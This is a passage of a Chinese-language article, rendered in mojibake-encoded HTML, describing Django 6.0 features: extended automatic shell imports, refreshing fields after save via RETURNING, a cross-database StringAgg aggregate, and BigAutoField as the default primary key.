<p>è¿™ç§å˜åŒ–æœ‰åŠ©äºæé«˜ API çš„æ¸…æ™°åº¦ï¼ŒDjango æ­£åœ¨é€æ­¥æ›´å¤šåœ°ä½¿ç”¨ä»…å…³é”®å­—å‚æ•°ã€‚django-upgrade å¯ä»¥é€šè¿‡å…¶ <code>mail_api_kwargs</code> ä¿®å¤ç¨‹åºè‡ªåŠ¨ä¸ºä½ ä¿®å¤è¿™ä¸€é—®é¢˜ã€‚</p>
<p>å†æ¬¡æ„Ÿè°¢ Mike Edmunds åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F36163" target="_blank" title="https://code.djangoproject.com/ticket/36163" ref="nofollow noopener noreferrer">Ticket #36163</a> ä¸­æ¨åŠ¨äº†è¿™ä¸€æ”¹è¿›ã€‚</p>
<h2 data-id="heading-12">æ‰©å±•è‡ªåŠ¨ <code>shell</code> å¯¼å…¥</h2>
<p>æ¥ä¸‹æ¥ï¼š</p>
<blockquote>
<p>ç°åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>django.conf.settings</code> ç­‰å¸¸ç”¨å·¥å…·ä¼šè‡ªåŠ¨å¯¼å…¥åˆ° shell ä¸­ã€‚</p>
</blockquote>
<p>Django 5.2 çš„ä¸€ä¸ªä¸»è¦åŠŸèƒ½æ˜¯ <a href="https://link.juejin.cn?target=https%3A%2F%2Fadamj.eu%2Ftech%2F2025%2F04%2F07%2Fdjango-whats-new-5.2%2F%23automatic-model-imports-in-the-shell" target="_blank" title="https://adamj.eu/tech/2025/04/07/django-whats-new-5.2/#automatic-model-imports-in-the-shell" ref="nofollow noopener noreferrer">shell ä¸­çš„è‡ªåŠ¨æ¨¡å‹å¯¼å…¥</a>ï¼Œä½¿å¾— <code>./manage.py shell</code> è‡ªåŠ¨å¯¼å…¥æ‰€æœ‰æ¨¡å‹ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼ŒDjango 6.0 ç°åœ¨è¿˜å¯¼å…¥äº†å…¶ä»–å¸¸ç”¨å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿è¡Œ <code>./manage.py shell</code> å¹¶æ·»åŠ  <code>-v 2</code> å‚æ•°æ¥æŸ¥çœ‹å®Œæ•´çš„å¯¼å…¥åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ ./manage.py shell -v 2
6 objects imported automatically:

  from django.conf import settings
  from django.db import connection, models, reset_queries
  from django.db.models import <span class="hljs-built_in">functions</span>
  from django.utils import timezone

...
</code></pre>
<p>ï¼ˆè¿™æ˜¯ä»ä¸€ä¸ªæ²¡æœ‰æ¨¡å‹çš„é¡¹ç›®ä¸­å¾—åˆ°çš„è¾“å‡ºï¼Œå› æ­¤åªåˆ—å‡ºäº†å·¥å…·ã€‚ï¼‰</p>
<p>æ‰€ä»¥ï¼Œè¿™äº›åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>settings</code>ï¼šç”¨äºæ£€æŸ¥è¿è¡Œæ—¶é…ç½®ï¼Œéå¸¸æœ‰ç”¨ï¼š</li>
</ul>
<pre><code class="hljs language-python" lang="python">In [<span class="hljs-number">1</span>]: settings.DEBUG
Out[<span class="hljs-number">1</span>]: <span class="hljs-literal">False</span>
</code></pre>
<ul>
<li><code>connection</code> å’Œ <code>reset_queries()</code>ï¼šéå¸¸é€‚åˆ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2Fstable%2Ffaq%2Fmodels%2F%23how-can-i-see-the-raw-sql-queries-django-is-running" target="_blank" title="https://docs.djangoproject.com/en/stable/faq/models/#how-can-i-see-the-raw-sql-queries-django-is-running" ref="nofollow noopener noreferrer">æ£€æŸ¥æ‰§è¡Œçš„æŸ¥è¯¢</a>ï¼š</li>
</ul>
<pre><code class="hljs language-python" lang="python">In [<span class="hljs-number">1</span>]: Book.objects.select_related(<span class="hljs-string">'author'</span>)
Out[<span class="hljs-number">1</span>]: &lt;QuerySet []&gt;

In [<span class="hljs-number">2</span>]: connection.queries
Out[<span class="hljs-number">2</span>]:
[{<span class="hljs-string">'sql'</span>: <span class="hljs-string">'SELECT "example_book"."id", "example_book"."title", "example_book"."author_id", "example_author"."id", "example_author"."name" FROM "example_book" INNER JOIN "example_author" ON ("example_book"."author_id" = "example_author"."id") LIMIT 21'</span>,
    <span class="hljs-string">'time'</span>: <span class="hljs-string">'0.000'</span>}]
</code></pre>
<ul>
<li><code>models</code> å’Œ <code>functions</code>ï¼šå¯¹äºé«˜çº§ ORM å·¥ä½œéå¸¸æœ‰ç”¨ï¼š</li>
</ul>
<pre><code class="hljs language-python" lang="python">In [<span class="hljs-number">1</span>]: Book.objects.annotate(
     ...:   title_lower=functions.Lower(<span class="hljs-string">"title"</span>)
     ...: ).<span class="hljs-built_in">filter</span>(
     ...:   title_lower__startswith=<span class="hljs-string">"a"</span>
     ...: ).count()
Out[<span class="hljs-number">1</span>]: <span class="hljs-number">71</span>
</code></pre>
<ul>
<li><code>timezone</code>ï¼šç”¨äºä½¿ç”¨ Django çš„æ—¶åŒºæ„ŸçŸ¥æ—¥æœŸå’Œæ—¶é—´å·¥å…·ï¼š</li>
</ul>
<pre><code class="hljs language-python" lang="python">In [<span class="hljs-number">1</span>]: timezone.now()
Out[<span class="hljs-number">1</span>]: datetime.datetime(<span class="hljs-number">2025</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">23</span>, <span class="hljs-number">42</span>, <span class="hljs-number">22</span>, <span class="hljs-number">558418</span>, tzinfo=datetime.timezone.utc)
</code></pre>
<p>ä»ç„¶å¯ä»¥æŒ‰ç…§ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2Fstable%2Fhowto%2Fcustom-shell%2F" target="_blank" title="https://docs.djangoproject.com/en/stable/howto/custom-shell/" ref="nofollow noopener noreferrer">å¦‚ä½•è‡ªå®šä¹‰ <code>shell</code> å‘½ä»¤</a> æ–‡æ¡£é¡µé¢ä¸­æ‰€è¿°ï¼Œæ‰©å±•è‡ªåŠ¨å¯¼å…¥å†…å®¹ã€‚</p>
<p>Salvo Polizzi åœ¨ Django 5.2 ä¸­è´¡çŒ®äº†åŸå§‹çš„è‡ªåŠ¨ shell å¯¼å…¥åŠŸèƒ½ã€‚ç„¶åï¼Œä»–åœ¨ Django 6.0 ä¸­åˆå›æ¥æä¾›äº†è¿™äº›é¢å¤–çš„å¯¼å…¥ï¼Œåœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F35680" target="_blank" title="https://code.djangoproject.com/ticket/35680" ref="nofollow noopener noreferrer">Ticket #35680</a> ä¸­ã€‚æ„Ÿè°¢å‚ä¸è®ºå›è®¨è®ºå¹¶è¾¾æˆä¸€è‡´æ„è§çš„æ¯ä¸ªäººï¼Œä»¥åŠ Natalia Bidart å’Œ Sarah Boyce çš„å®¡æŸ¥ï¼</p>
<h2 data-id="heading-13">ä¿å­˜æ—¶åŠ¨æ€å­—æ®µåˆ·æ–°</h2>
<p>ç°åœ¨è®©æˆ‘ä»¬è®¨è®ºä¸€ç³»åˆ— ORM æ”¹è¿›ï¼Œä»è¿™ä¸ªé‡å¤§æ”¹è¿›å¼€å§‹ï¼š</p>
<blockquote>
<p>åœ¨æ”¯æŒ <code>RETURNING</code> å­å¥çš„åç«¯ï¼ˆSQLiteã€PostgreSQL å’Œ Oracleï¼‰ä¸Šï¼Œ<code>GeneratedField</code> å’Œè¢«èµ‹å€¼ä¸ºè¡¨è¾¾å¼çš„å­—æ®µåœ¨è°ƒç”¨ <code>save()</code> ä¹‹åä¼šä»æ•°æ®åº“ä¸­åˆ·æ–°ã€‚åœ¨ä¸æ”¯æŒå®ƒçš„åç«¯ï¼ˆMySQL å’Œ MariaDBï¼‰ä¸Šï¼Œå­—æ®µä¼šè¢«æ ‡è®°ä¸ºå»¶è¿ŸåŠ è½½ï¼Œä»¥åœ¨åç»­è®¿é—®æ—¶è§¦å‘åˆ·æ–°ã€‚</p>
</blockquote>
<p>Django æ¨¡å‹æ”¯æŒåœ¨ä¸‰ç§æƒ…å†µä¸‹è®©æ•°æ®åº“ä¸ºä½ ç”Ÿæˆå­—æ®µå€¼ï¼š</p>
<ol>
<li><code>db_default</code> å­—æ®µé€‰é¡¹ï¼Œå®ƒå…è®¸æ•°æ®åº“åœ¨åˆ›å»ºå®ä¾‹æ—¶ç”Ÿæˆé»˜è®¤å€¼ï¼š</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models
<span class="hljs-keyword">from</span> django.db.models.functions <span class="hljs-keyword">import</span> Now

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Video</span>(models.Model):
    ...
    created = models.DateTimeField(db_default=Now())
</code></pre>
<ol start="2">
<li><code>GeneratedField</code> å­—æ®µç±»å‹ï¼Œå®ƒå§‹ç»ˆåŸºäºåŒä¸€å®ä¾‹ä¸­çš„å…¶ä»–å­—æ®µç”±æ•°æ®åº“è®¡ç®—å¾—å‡ºï¼š</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models
<span class="hljs-keyword">from</span> django.db.models.functions <span class="hljs-keyword">import</span> Concat

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Video</span>(models.Model):
    ...
    full_title = models.GeneratedField(
        models.TextField(),
        expression=Concat(
            <span class="hljs-string">"title"</span>,
            models.Value(<span class="hljs-string">" - "</span>),
            <span class="hljs-string">"subtitle"</span>,
        ),
    )
</code></pre>
<ol start="3">
<li>åœ¨ä¿å­˜ä¹‹å‰ä¸ºå­—æ®µåˆ†é…è¡¨è¾¾å¼å€¼ï¼š</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models
<span class="hljs-keyword">from</span> django.db.models.functions <span class="hljs-keyword">import</span> Now

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Video</span>(models.Model):
    ...
    last_updated = models.DateTimeField()

video = Video.objects.get(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>)
...
video.last_updated = Now()
video.save()
</code></pre>
<p>ä»¥å‰ï¼Œåªæœ‰ç¬¬ä¸€ç§æ–¹æ³•ï¼ˆä½¿ç”¨ <code>db_default</code>ï¼‰ä¼šåœ¨ä¿å­˜åä»æ•°æ®åº“ä¸­åˆ·æ–°å­—æ®µå€¼ã€‚å…¶ä»–ä¸¤ç§æ–¹æ³•ä¼šç•™ä¸‹æ—§å€¼æˆ–è¡¨è¾¾å¼å¯¹è±¡ï¼Œè¿™æ„å‘³ç€å¦‚æœä½ éœ€è¦è·å–æ›´æ–°åçš„å€¼ï¼Œå°±éœ€è¦è°ƒç”¨ <code>Model.refresh_from_db()</code>ã€‚è¿™å¾ˆéš¾è®°ä½ï¼Œå¹¶ä¸”ä¼šé¢å¤–äº§ç”Ÿä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢ã€‚</p>
<p>ç°åœ¨ï¼ŒDjango åˆ©ç”¨ <code>RETURNING</code> SQL å­å¥åœ¨æ”¯æŒå®ƒçš„åç«¯ï¼ˆSQLiteã€PostgreSQL å’Œ Oracleï¼‰ä¸Šä¿å­˜æ¨¡å‹å®ä¾‹ï¼Œå¹¶åœ¨å•ä¸ªæŸ¥è¯¢ä¸­è·å–æ›´æ–°åçš„åŠ¨æ€å­—æ®µå€¼ã€‚<code>save()</code> è°ƒç”¨ç°åœ¨å¯èƒ½ä¼šå‘å‡ºå¦‚ä¸‹æŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">UPDATE</span> "example_video"
<span class="hljs-keyword">SET</span> "last_updated" <span class="hljs-operator">=</span> NOW()
<span class="hljs-keyword">WHERE</span> "example_video"."id" <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
RETURNING "example_video"."last_updated"
</code></pre>
<p>Django å°†è¿”å›å€¼æ”¾å…¥æ¨¡å‹å­—æ®µä¸­ï¼Œå› æ­¤ä½ å¯ä»¥åœ¨ä¿å­˜åç«‹å³è¯»å–å®ƒï¼š</p>
<pre><code class="hljs language-python" lang="python">video = Video.objects.get(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>)
...
video.last_updated = Now()
video.save()
<span class="hljs-built_in">print</span>(video.last_updated)  <span class="hljs-comment"># æ•°æ®åº“ä¸­çš„æ›´æ–°å€¼</span>
</code></pre>
<p>åœ¨ä¸æ”¯æŒ <code>RETURNING</code>ï¼ˆMySQL å’Œ MariaDBï¼‰çš„åç«¯ä¸Šï¼ŒDjango ç°åœ¨ä¼šåœ¨ä¿å­˜åå°†åŠ¨æ€å­—æ®µæ ‡è®°ä¸ºå»¶è¿ŸåŠ è½½ã€‚è¿™æ ·ï¼Œåç»­è®¿é—®ï¼ˆå¦‚ä¸Šé¢çš„ç¤ºä¾‹ï¼‰å°†è‡ªåŠ¨è°ƒç”¨ <code>Model.refresh_from_db()</code>ã€‚è¿™ç¡®ä¿äº†ä½ æ€»æ˜¯è¯»å–æ›´æ–°åçš„å€¼ï¼Œå³ä½¿è¿™ä¼šé¢å¤–äº§ç”Ÿä¸€ä¸ªæŸ¥è¯¢ã€‚</p>
<h3 data-id="heading-14">å†å²</h3>
<p>è¿™ä¸ªåŠŸèƒ½åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F27222" target="_blank" title="https://code.djangoproject.com/ticket/27222" ref="nofollow noopener noreferrer">Ticket #27222</a> ä¸­äº 2016 å¹´è¢«æå‡ºï¼Œç”± Anssi KÃ¤Ã¤riÃ¤inen æå‡ºã€‚åœ¨è¿‡å»çš„ä¹å¹´ä¸­ï¼Œè¿™ä¸ªæè®®å¤§éƒ¨åˆ†æ—¶é—´éƒ½å¤„äºä¼‘çœ çŠ¶æ€ï¼Œä½† ORM è´Ÿè´£äºº Simon Charette ä»Šå¹´æ—©äº›æ—¶å€™æ¥æ‰‹äº†è¿™ä¸ªåŠŸèƒ½ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå®ç°æ–¹æ¡ˆï¼Œå¹¶å°†å…¶æ¨åŠ¨å®Œæˆã€‚æ„Ÿè°¢ Simon ç»§ç»­æ¨åŠ¨ ORM çš„å‘å±•ï¼Œä»¥åŠæ‰€æœ‰å‚ä¸å®¡æŸ¥çš„äººå‘˜ï¼šDavid Sandersã€Jacob Wallsã€Mariusz Felisiakã€nessitaã€Paolo Melchiorreã€Simon Charette å’Œ Tim Grahamã€‚</p>
<h2 data-id="heading-15">é€šç”¨ <code>StringAgg</code> èšåˆå‡½æ•°</h2>
<p>æ¥ä¸‹æ¥æ˜¯ ORM çš„å¦ä¸€ä¸ªå˜åŒ–ï¼š</p>
<blockquote>
<p>æ–°çš„ <code>StringAgg</code> èšåˆå‡½æ•°å°†è¾“å…¥å€¼è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥ <code>delimiter</code> å­—ç¬¦ä¸²åˆ†éš”ã€‚è¿™ä¸ªèšåˆå‡½æ•°ä»¥å‰ä»…æ”¯æŒ PostgreSQLã€‚</p>
</blockquote>
<p>è¿™ä¸ªèšåˆå‡½æ•°é€šå¸¸ç”¨äºç”Ÿæˆç›¸å…³é¡¹ç›®çš„é€—å·åˆ†éš”åˆ—è¡¨ç­‰ã€‚ä»¥å‰ï¼Œå®ƒä»…ä½œä¸º <code>django.contrib.postgres</code> çš„ä¸€éƒ¨åˆ†æ”¯æŒ PostgreSQLï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates <span class="hljs-keyword">import</span> StringAgg
<span class="hljs-keyword">from</span> example.models <span class="hljs-keyword">import</span> Video

videos = Video.objects.annotate(
    chapter_ids=StringAgg(<span class="hljs-string">"chapter"</span>, delimiter=<span class="hljs-string">","</span>),
)

<span class="hljs-keyword">for</span> video <span class="hljs-keyword">in</span> videos:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Video <span class="hljs-subst">{video.<span class="hljs-built_in">id</span>}</span> has chapters: <span class="hljs-subst">{video.chapter_ids}</span>"</span>)
</code></pre>
<p>è¿™å¯èƒ½ä¼šè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Video</span> <span class="hljs-number">104</span> <span class="hljs-selector-tag">has</span> <span class="hljs-selector-tag">chapters</span>: <span class="hljs-number">71</span>,<span class="hljs-number">72</span>,<span class="hljs-number">74</span>
<span class="hljs-selector-tag">Video</span> <span class="hljs-number">107</span> <span class="hljs-selector-tag">has</span> <span class="hljs-selector-tag">chapters</span>: <span class="hljs-number">88</span>,<span class="hljs-number">89</span>,<span class="hljs-number">138</span>,<span class="hljs-number">90</span>,<span class="hljs-number">91</span>,<span class="hljs-number">93</span>
</code></pre>
<p>ç°åœ¨ï¼Œè¿™ä¸ªèšåˆå‡½æ•°å·²ç»å¯ä»¥åœ¨ Django æ”¯æŒçš„æ‰€æœ‰æ•°æ®åº“åç«¯ä¸­ä½¿ç”¨ï¼Œä» <code>django.db.models</code> ä¸­å¯¼å…¥ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> StringAgg, Value
<span class="hljs-keyword">from</span> example.models <span class="hljs-keyword">import</span> Video

videos = Video.objects.annotate(
    chapter_ids=StringAgg(<span class="hljs-string">"chapter"</span>, delimiter=Value(<span class="hljs-string">","</span>)),
)

<span class="hljs-keyword">for</span> video <span class="hljs-keyword">in</span> videos:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Video <span class="hljs-subst">{video.<span class="hljs-built_in">id</span>}</span> has chapters: <span class="hljs-subst">{video.chapter_ids}</span>"</span>)
</code></pre>
<p>æ³¨æ„ï¼Œ<code>delimiter</code> å‚æ•°ç°åœ¨éœ€è¦ä¸€ä¸ª <code>Value()</code> è¡¨è¾¾å¼åŒ…è£…å™¨æ¥å¤„ç†å­—é¢å­—ç¬¦ä¸²ï¼Œå¦‚ä¸Šæ‰€ç¤ºã€‚è¿™ç§å˜åŒ–å…è®¸ä½ ä½¿ç”¨æ•°æ®åº“å‡½æ•°æˆ–å­—æ®µä½œä¸ºåˆ†éš”ç¬¦ï¼ˆå¦‚æœéœ€è¦ï¼‰ã€‚</p>
<p>è™½ç„¶å¤§å¤šæ•° Django é¡¹ç›®éƒ½ä½¿ç”¨ PostgreSQLï¼Œä½†åœ¨æ‰€æœ‰åç«¯ä¸Šæä¾›è¿™ä¸ªèšåˆå‡½æ•°æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ”¹è¿›ï¼Œå®ƒæé«˜äº†è·¨æ•°æ®åº“çš„å…¼å®¹æ€§ï¼Œå¹¶ä¸”æ„å‘³ç€ç¬¬ä¸‰æ–¹åŒ…å¯ä»¥ä½¿ç”¨å®ƒè€Œä¸ä¼šå½±å“å…¶æ•°æ®åº“æ”¯æŒã€‚</p>
<h3 data-id="heading-16">å†å²</h3>
<p>PostgreSQL ç‰¹æœ‰çš„ <code>StringAgg</code> æœ€æ—©åœ¨ Django 1.9ï¼ˆ2015 å¹´ï¼‰ç”± Andriy Sokolovskiy æ·»åŠ ï¼Œè§ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F24301" target="_blank" title="https://code.djangoproject.com/ticket/24301" ref="nofollow noopener noreferrer">Ticket #24301</a>ã€‚åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F35444" target="_blank" title="https://code.djangoproject.com/ticket/35444" ref="nofollow noopener noreferrer">Ticket #35444</a> ä¸­ï¼ŒChris Muthig æå‡ºäº†æ·»åŠ  <code>Aggregate.order_by</code> é€‰é¡¹ï¼Œè¿™æ˜¯ <code>StringAgg</code> ç”¨æ¥æŒ‡å®šè¿æ¥å…ƒç´ é¡ºåºçš„é€‰é¡¹ï¼Œè€Œä½œä¸ºå‰¯ä½œç”¨ï¼Œè¿™ä¹Ÿä½¿å¾—å°† <code>StringAgg</code> æ¨å¹¿åˆ°æ‰€æœ‰åç«¯æˆä¸ºå¯èƒ½ã€‚</p>
<p>æ„Ÿè°¢ Chris æå‡ºå¹¶å®ç°äº†è¿™ä¸€å˜åŒ–ï¼Œä»¥åŠæ‰€æœ‰å‚ä¸å®¡æŸ¥çš„äººå‘˜ï¼šPaolo Melchiorreã€Sarah Boyce å’Œ Simon Charetteã€‚</p>
<h2 data-id="heading-17"><code>BigAutoField</code> ä½œä¸ºé»˜è®¤ä¸»é”®ç±»å‹</h2>
<p>æ¥ä¸‹æ¥ï¼š</p>
<blockquote>
<p><code>DEFAULT_AUTO_FIELD</code> è®¾ç½®çš„é»˜è®¤å€¼ç°åœ¨æ”¹ä¸º <code>BigAutoField</code>ã€‚</p>
</blockquote>
<p>è¿™ä¸€é‡è¦å˜åŒ–æœ‰åŠ©äºé”å®šæ›´å¤§è§„æ¨¡çš„å¯æ‰©å±•ä¸»é”®ã€‚</p>
<p>Django 3.2ï¼ˆ2021 å¹´ï¼‰å¼•å…¥äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2Fstable%2Fref%2Fsettings%2F%23default-auto-field" target="_blank" title="https://docs.djangoproject.com/en/stable/ref/settings/#default-auto-field" ref="nofollow noopener noreferrer">DEFAULT_AUTO_FIELD è®¾ç½®</a>ï¼Œç”¨äºæ›´æ”¹æ¨¡å‹ä¸­ä½¿ç”¨çš„é»˜è®¤ä¸»é”®ç±»å‹ã€‚Django ä½¿ç”¨è¿™ä¸ªè®¾ç½®ä¸ºæœªæ˜¾å¼å®šä¹‰ä¸»é”®å­—æ®µçš„æ¨¡å‹æ·»åŠ ä¸€ä¸ªåä¸º <code>id</code> çš„ä¸»é”®å­—æ®µã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ å®šä¹‰äº†ä¸€ä¸ªæ¨¡å‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Video</span>(models.Model):
    title = models.TextField()
</code></pre>
<p>é‚£ä¹ˆå®ƒå°†æœ‰ä¸¤ä¸ªå­—æ®µï¼š<code>id</code> å’Œ <code>title</code>ï¼Œå…¶ä¸­ <code>id</code> ä½¿ç”¨ <code>DEFAULT_AUTO_FIELD</code> å®šä¹‰çš„ç±»å‹ã€‚</p>
<p>è¿™ä¸ªè®¾ç½®ä¹Ÿå¯ä»¥é€šè¿‡åœ¨åº”ç”¨çš„ <code>apps.py</code> æ–‡ä»¶ä¸­å®šä¹‰ <code>AppConfig.default_auto_field</code> æ¥åœ¨æ¯ä¸ªåº”ç”¨çš„åŸºç¡€ä¸Šè¦†ç›–ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.apps <span class="hljs-keyword">import</span> AppConfig

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ChannelConfig</span>(<span class="hljs-title class_ inherited__">AppConfig</span>):
    name = <span class="hljs-string">"channel"</span>
    default_auto_field = <span class="hljs-string">"django.db.models.BigAutoField"</span>
</code></pre>
<p>æ·»åŠ è¿™ä¸ªè®¾ç½®çš„ä¸€ä¸ªä¸»è¦åŠ¨æœºæ˜¯å…è®¸é¡¹ç›®ä» <code>AutoField</code>ï¼ˆ32 ä½æ•´æ•°ï¼‰åˆ‡æ¢åˆ° <code>BigAutoField</code>ï¼ˆ64 ä½æ•´æ•°ï¼‰ä½œä¸ºä¸»é”®ï¼Œè€Œæ— éœ€æ›´æ”¹æ¯ä¸ªæ¨¡å‹ã€‚<code>AutoField</code> å¯ä»¥å­˜å‚¨çš„å€¼æœ€å¤šçº¦ä¸º 21 äº¿ï¼Œè™½ç„¶å¬èµ·æ¥å¾ˆå¤§ï¼Œä½†åœ¨å¤§è§„æ¨¡åº”ç”¨ä¸­å¾ˆå®¹æ˜“è¾¾åˆ°ã€‚<code>BigAutoField</code> å¯ä»¥å­˜å‚¨çš„å€¼æœ€å¤šçº¦ä¸º 92 äº¬ï¼Œè¿™åœ¨å®é™…ç”¨é€”ä¸­æ˜¯â€œç»°ç»°æœ‰ä½™â€çš„ã€‚</p>
<p>å¦‚æœä½¿ç”¨ <code>AutoField</code> çš„æ¨¡å‹è¾¾åˆ°äº†å…¶æœ€å¤§å€¼ï¼Œå®ƒå°†æ— æ³•å†æ¥å—æ–°è¡Œï¼Œè¿™ä¸ªé—®é¢˜è¢«ç§°ä¸º <strong>ä¸»é”®è€—å°½</strong>ã€‚è¯¥è¡¨å®é™…ä¸Šè¢«é˜»å¡äº†ï¼Œéœ€è¦é€šè¿‡é”å®šæ•°æ®åº“è¿ç§»åœ¨å¤§å‹è¡¨ä¸Šç´§æ€¥å°†æ¨¡å‹ä» <code>AutoField</code> åˆ‡æ¢åˆ° <code>BigAutoField</code>ã€‚å…³äº Kraken å¦‚ä½•ä¿®å¤è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è§‚çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DkZ4q0k_FNhw" target="_blank" title="https://www.youtube.com/watch?v=kZ4q0k_FNhw" ref="nofollow noopener noreferrer">Tim Bell åœ¨ 2025 å¹´ DjangoCon Europe çš„æ¼”è®²</a>ï¼Œå…¶ä¸­è¯¦ç»†ä»‹ç»äº†ä¸»åŠ¨è¿ç§»å¤§å‹è¡¨ä»¥å‡å°‘åœæœºæ—¶é—´çš„ä¸€äº›å·§å¦™æŠ€æœ¯ã€‚</p>
<p>ä¸ºäº†é¿å…æ–°é¡¹ç›®å‡ºç°è¿™ä¸ªé—®é¢˜ï¼ŒDjango 3.2 ä½¿å¾—é€šè¿‡ <code>startproject</code> åˆ›å»ºçš„æ–°é¡¹ç›®å°† <code>DEFAULT_AUTO_FIELD</code> è®¾ç½®ä¸º <code>BigAutoField</code>ï¼Œå¹¶ä¸”é€šè¿‡ <code>startapp</code> åˆ›å»ºçš„æ–°åº”ç”¨å°†å®ƒä»¬çš„ <code>AppConfig.default_auto_field</code> è®¾ç½®ä¸º <code>BigAutoField</code>ã€‚å®ƒè¿˜æ·»åŠ äº†ä¸€ä¸ªç³»ç»Ÿæ£€æŸ¥ï¼Œä»¥ç¡®ä¿é¡¹ç›®æ˜¾å¼è®¾ç½® <code>DEFAULT_AUTO_FIELD</code>ï¼Œä»¥ç¡®ä¿ç”¨æˆ·äº†è§£è¯¥åŠŸèƒ½å¹¶èƒ½å¤Ÿåšå‡ºæ˜æ™ºçš„é€‰æ‹©ã€‚</p>
<p>ç°åœ¨ï¼ŒDjango 6.0 å°†è®¾ç½®å’Œåº”ç”¨é…ç½®å±æ€§çš„å®é™…é»˜è®¤å€¼æ”¹ä¸º <code>BigAutoField</code>ã€‚ä½¿ç”¨ <code>BigAutoField</code> çš„é¡¹ç›®å¯ä»¥ç§»é™¤è¯¥è®¾ç½®ï¼š</p>
<pre><code class="hljs language-python" lang="python">-DEFAULT_AUTO_FIELD = <span class="hljs-string">"django.db.models.BigAutoField"</span>
</code></pre>
<p>ä»¥åŠåº”ç”¨é…ç½®å±æ€§ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.apps <span class="hljs-keyword">import</span> AppConfig

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ChannelConfig</span>(<span class="hljs-title class_ inherited__">AppConfig</span>):
    name = <span class="hljs-string">"channel"</span>
-    default_auto_field = <span class="hljs-string">"django.db.models.BigAutoField"</span>
</code></pre>
<p>é»˜è®¤çš„ <code>startproject</code> å’Œ <code>startapp</code> æ¨¡æ¿ä¹Ÿä¸å†è®¾ç½®è¿™äº›å€¼ã€‚è¿™ä¸€å˜åŒ–å‡å°‘äº†æ–°é¡¹ç›®çš„æ ·æ¿ä»£ç ï¼Œä¸»é”®è€—å°½é—®é¢˜ä¹Ÿå°†é€æ¸æˆä¸ºå†å²ï¼Œæˆä¸ºå¤§å¤šæ•° Django ç”¨æˆ·ä¸å†éœ€è¦è€ƒè™‘çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-18">å†å²</h3>
<p>åœ¨ Django 3.2 ä¸­æ·»åŠ  <code>DEFAULT_AUTO_FIELD</code> æ˜¯ç”± Caio Ariede æå‡ºå¹¶ç”± Tom Forbes å®ç°çš„ï¼Œè§ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F31007" target="_blank" title="https://code.djangoproject.com/ticket/31007" ref="nofollow noopener noreferrer">Ticket #31007</a>ã€‚Django 6.0 ä¸­çš„è¿™ä¸€æ–°å˜åŒ–æ˜¯ç”±å‰ Fellow Tim Graham æå‡ºå¹¶å®ç°çš„ï¼Œè§ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F36564" target="_blank" title="https://code.djangoproject.com/ticket/36564" ref="nofollow noopener noreferrer">Ticket #36564</a>ã€‚æ„Ÿè°¢ Tim å‘ç°ç°åœ¨å¯ä»¥è¿›è¡Œè¿™ä¸€æ¸…ç†å·¥ä½œï¼Œä»¥åŠ Jacob Walls å’Œ Clifford Gama çš„å®¡æŸ¥ï¼</p>
<h2 data-id="heading-19">æ¨¡æ¿å˜é‡ <code>forloop.length</code></h2>
